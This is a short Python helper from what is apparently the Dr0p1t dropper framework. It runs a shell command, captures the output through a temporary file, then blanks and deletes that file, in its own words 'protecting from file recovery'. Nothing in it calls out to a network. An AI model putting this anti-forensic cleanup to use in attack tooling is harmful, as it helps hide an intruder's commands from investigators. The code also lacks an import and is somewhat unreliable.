#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#this functions for :
#get_output(cmd): to get output of command without using pipe to escape the fatal error after compiling !!
#Start

def get_output(cmd):
	x = subprocess.Popen( 'copy /b NUL out >> NUL',shell=True)
	x = subprocess.Popen( "{} >> out".format(cmd),shell=True)
	x.wait()
	out = open("out","r").read()
	ff=open("out","w");ff.close() #protecting from file recovery :D
	x = subprocess.Popen( 'del out >> NUL',creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	return out
